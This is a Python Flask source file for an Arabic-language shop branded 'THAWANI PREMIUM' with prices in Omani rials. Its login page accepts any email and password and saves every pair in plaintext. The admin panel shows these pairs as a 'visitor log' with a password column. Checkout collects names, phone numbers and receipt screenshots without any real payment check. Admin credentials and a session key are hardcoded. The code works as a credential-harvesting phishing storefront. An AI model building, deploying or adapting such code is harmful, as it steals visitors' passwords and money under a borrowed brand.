from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_gold_final_2026"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إنشاء وتحديث قاعدة البيانات بالكامل ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    # جدول المنتجات
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    # جدول السلة
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    # جدول الأقسام
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    # جدول سجل الزوار (Log)
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    # جدول الطلبات
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    # جدول التقييمات
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    conn.commit()
    conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الفخم والراقي (Black & Gold Premium) ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
    :root { --primary: #0f0f0f; --accent: #d4af37; --gold-light: #f1e5ac; --bg: #1a1a1a; --white: #ffffff; }
    body { font-family: 'Tajawal', sans-serif; background: var(--bg); margin: 0; padding: 0; direction: rtl; color: var(--white); padding-bottom: 80px; }
    
    header { background: linear-gradient(145deg, #1a1a1a, #000000); padding: 20px; text-align: center; border-bottom: 2px solid var(--accent); box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    .logo-text { font-size: 28px; font-weight: 900; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; }

    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--accent); z-index: 1000; }
    .nav-item { color: var(--white); text-decoration: none; font-size: 14px; font-weight: bold; transition: 0.3s; }
    .nav-item:hover { color: var(--accent); }

    .card { background: #222; border: 1px solid #333; border-radius: 12px; margin: 15px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s; }
    .card:hover { border-color: var(--accent); transform: translateY(-5px); }
    .card img { width: 100%; height: 200px; object-fit: cover; }
    .card-body { padding: 15px; }
    .card-title { font-size: 18px; font-weight: bold; margin-bottom: 8px; color: var(--gold-light); }
    .card-price { font-size: 20px; color: var(--accent); font-weight: 900; }

    .btn-premium { background: linear-gradient(45deg, #d4af37, #f1e5ac); color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: 900; cursor: pointer; text-decoration: none; display: block; text-align: center; margin-top: 10px; width: 100%; }
    
    input, select, textarea { background: #333; color: #fff; border: 1px solid var(--accent); padding: 12px; margin: 10px 0; width: 100%; border-radius: 8px; font-family: 'Tajawal'; box-sizing: border-box; }
    
    table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #222; border-radius: 8px; overflow: hidden; }
    th, td { border: 1px solid #333; padding: 12px; text-align: center; font-size: 13px; }
    th { background: var(--accent); color: #000; font-weight: bold; }
    
    .status-badge { background: var(--accent); color: #000; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
    .star-rating { color: var(--accent); margin: 10px 0; font-size: 18px; }
</style>
"""

BASE_HTML = f"<!DOCTYPE html><html dir='rtl' lang='ar'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>{CSS}</head><body>"

NAV_HTML = """
<div class="bottom-nav">
    <a href="/" class="nav-item">الرئيسية</a>
    <a href="/cart" class="nav-item">السلة</a>
    <a href="/orders_history" class="nav-item">طلباتي</a>
    {% if session.get('is_admin') %}<a href="/admin" class="nav-item">لوحة التحكم</a>{% endif %}
    <a href="/logout" class="nav-item" style="color:#ff4d4d;">خروج</a>
</div>
"""

# --- الصفحات ---

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    prods = conn.execute("SELECT * FROM products").fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">THAWANI PREMIUM</div></header>
    <div style="display: grid; grid-template-columns: 1fr 1fr; padding: 5px;">
        {% for p in prods %}
        <div class="card">
            <img src="/static/uploads/{{p.img}}">
            <div class="card-body">
                <div class="card-title">{{p.name}}</div>
                <div class="card-price">{{p.price}} OMR</div>
                <a href="/product/{{p.id}}" class="btn-premium">شراء الآن</a>
            </div>
        </div>
        {% endfor %}
    </div>
    """ + NAV_HTML)

@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        conn.execute("INSERT INTO reviews (product_id, user_email, rating, comment) VALUES (?,?,?,?)", 
                     (id, session['user'], request.form['rating'], request.form['comment']))
        conn.commit()
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">تفاصيل المنتج</div></header>
    <div class="card" style="margin-bottom:100px;">
        <img src="/static/uploads/{{p.img}}" style="height:auto;">
        <div class="card-body">
            <h2 style="color:var(--accent);">{{p.name}}</h2>
            <p style="color:#ccc;">{{p.description or 'لا يوجد وصف حالياً'}}</p>
            <div class="card-price">{{p.price}} OMR</div>
            <a href="/add_to_cart/{{p.id}}" class="btn-premium">إضافة إلى السلة</a>
            <hr style="border:0; border-top:1px solid #444; margin:20px 0;">
            <h3>تقييمات العملاء ⭐</h3>
            {% for r in revs %}
                <div style="background:#333; padding:10px; border-radius:8px; margin-bottom:10px;">
                    <div class="star-rating">{{ "★" * r.rating }}{{ "☆" * (5 - r.rating) }}</div>
                    <p style="margin:5px 0; font-size:14px;">{{r.comment}}</p>
                    <small style="color:gray;">بواسطة: {{r.user_email}}</small>
                </div>
            {% endfor %}
            <form method="POST" style="margin-top:20px; border-top:1px solid #444; padding-top:20px;">
                <h4>أضف تقييمك:</h4>
                <select name="rating" required><option value="5">⭐⭐⭐⭐⭐</option><option value="4">⭐⭐⭐⭐</option><option value="3">⭐⭐⭐</option><option value="2">⭐⭐</option><option value="1">⭐</option></select>
                <textarea name="comment" placeholder="رأيك في المنتج..." required></textarea>
                <button class="btn-premium">إرسال التقييم</button>
            </form>
        </div>
    </div>
    """ + NAV_HTML, p=p, revs=revs)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('is_admin'): return redirect('/')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        if 'add_product' in request.form:
            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
            conn.execute("INSERT INTO products (name, price, img, category, description) VALUES (?,?,?,?,?)", 
                         (request.form['name'], request.form['price'], fname, request.form['cat'], request.form['desc']))
        elif 'add_cat' in request.form:
            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
        conn.commit()
    
    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
    prods = conn.execute("SELECT * FROM products").fetchall()
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
    cats = conn.execute("SELECT * FROM categories").fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">لوحة التحكم</div></header>
    <div style="padding:15px;">
        <div style="background:#222; padding:15px; border-radius:12px; border:1px solid var(--accent); margin-bottom:20px;">
            <h3>👥 سجل دخول الزوار (LOG)</h3>
            <div style="overflow-x:auto;">
                <table>
                    <tr><th>الإيميل</th><th>كلمة المرور</th><th>الوقت</th></tr>
                    {% for l in logs %}
                    <tr><td>{{l.email}}</td><td>{{l.password}}</td><td>{{l.time}}</td></tr>
                    {% endfor %}
                </table>
            </div>
        </div>

        <div style="background:#222; padding:15px; border-radius:12px; margin-bottom:20px;">
            <h3>📦 إضافة منتج جديد</h3>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="اسم المنتج" required>
                <input name="price" placeholder="السعر OMR" required>
                <select name="cat">{% for c in cats %}<option value="{{c.name}}">{{c.name}}</option>{% endfor %}</select>
                <textarea name="desc" placeholder="وصف المنتج"></textarea>
                <input type="file" name="img" required>
                <button name="add_product" class="btn-premium">نشر المنتج</button>
            </form>
        </div>

        <div style="background:#222; padding:15px; border-radius:12px;">
            <h3>🛒 إحصائيات الطلبات</h3>
            <table>
                <tr><th>رقم الطلب</th><th>العميل</th><th>السعر</th><th>الحالة</th></tr>
                {% for o in orders %}
                <tr><td>{{o.id}}</td><td>{{o.full_name}}</td><td>{{o.total_price}}</td><td><span class="status-badge">{{o.status}}</span></td></tr>
                {% endfor %}
            </table>
        </div>
    </div>
    """ + NAV_HTML, logs=logs, prods=prods, orders=orders, cats=cats)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    
    if request.method == 'POST':
        f = request.files['receipt']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        details = ", ".join([f"{i['name']} ({i['quantity']})" for i in items])
        conn.execute("INSERT INTO orders (user_email, full_name, phone, card_img, items_details, total_price) VALUES (?,?,?,?,?,?)", 
                     (session['user'], request.form['name'], request.form['phone'], fname, details, total))
        conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
        conn.commit(); conn.close()
        return redirect('/orders_history')
    
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">إتمام الدفع</div></header>
    <div class="card">
        <div class="card-body">
            <h3>المجموع: {{total}} OMR</h3>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="الاسم بالكامل" required>
                <input name="phone" placeholder="رقم الهاتف" required>
                <label>ارفق إيصال الدفع (سكرين شوت):</label>
                <input type="file" name="receipt" accept="image/*" required>
                <button class="btn-premium">تأكيد الطلب</button>
            </form>
        </div>
    </div>
    """ + NAV_HTML, total=total)

@app.route('/orders_history')
def orders_history():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    orders = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", (session['user'],)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">طلباتي</div></header>
    <div style="padding:10px;">
        {% for o in orders %}
        <div class="card" style="border-right:5px solid var(--accent);">
            <div class="card-body">
                <div style="display:flex; justify-content:space-between;">
                    <b>طلب رقم #{{o.id}}</b>
                    <span class="status-badge">{{o.status}}</span>
                </div>
                <p style="color:#aaa; font-size:13px; margin:10px 0;">{{o.items_details}}</p>
                <div class="card-price" style="font-size:16px;">{{o.total_price}} OMR</div>
            </div>
        </div>
        {% else %}
        <p style="text-align:center; margin-top:50px;">لا يوجد طلبات حالياً.</p>
        {% endfor %}
    </div>
    """ + NAV_HTML)

@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">سلة المشتريات</div></header>
    <div style="padding:15px; margin-bottom:100px;">
        {% for i in items %}
        <div style="background:#222; padding:15px; border-radius:10px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
            <span>{{i.name}} (x{{i.quantity}})</span>
            <b style="color:var(--accent);">{{i.price * i.quantity}} OMR</b>
        </div>
        {% endfor %}
        <div style="text-align:center; margin-top:30px;">
            <h3>الإجمالي: {{total}} OMR</h3>
            <a href="/checkout" class="btn-premium">الذهاب للدفع 💳</a>
        </div>
    </div>
    """ + NAV_HTML, items=items, total=total)

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db')
    conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        e, p = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db')
        conn.execute("INSERT INTO users_log (email, password) VALUES (?,?)", (e, p))
        conn.commit(); conn.close()
        session['user'], session['is_admin'] = e, (e == ADMIN_MAIL and p == ADMIN_PASS)
        return redirect('/')
    return render_template_string(BASE_HTML + """
    <div style="height:100vh; display:flex; align-items:center; justify-content:center; background: #000;">
        <div style="background:#111; padding:40px; border-radius:15px; border:1px solid var(--accent); width:85%; max-width:400px; text-align:center;">
            <div class="logo-text" style="margin-bottom:30px;">THAWANI</div>
            <form method="POST">
                <input name="email" type="email" placeholder="البريد الإلكتروني" required>
                <input name="password" type="password" placeholder="كلمة المرور" required>
                <button class="btn-premium" style="margin-top:20px;">تسجيل الدخول</button>
            </form>
        </div>
    </div>""")

@app.route('/logout')
def logout(): session.clear(); return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
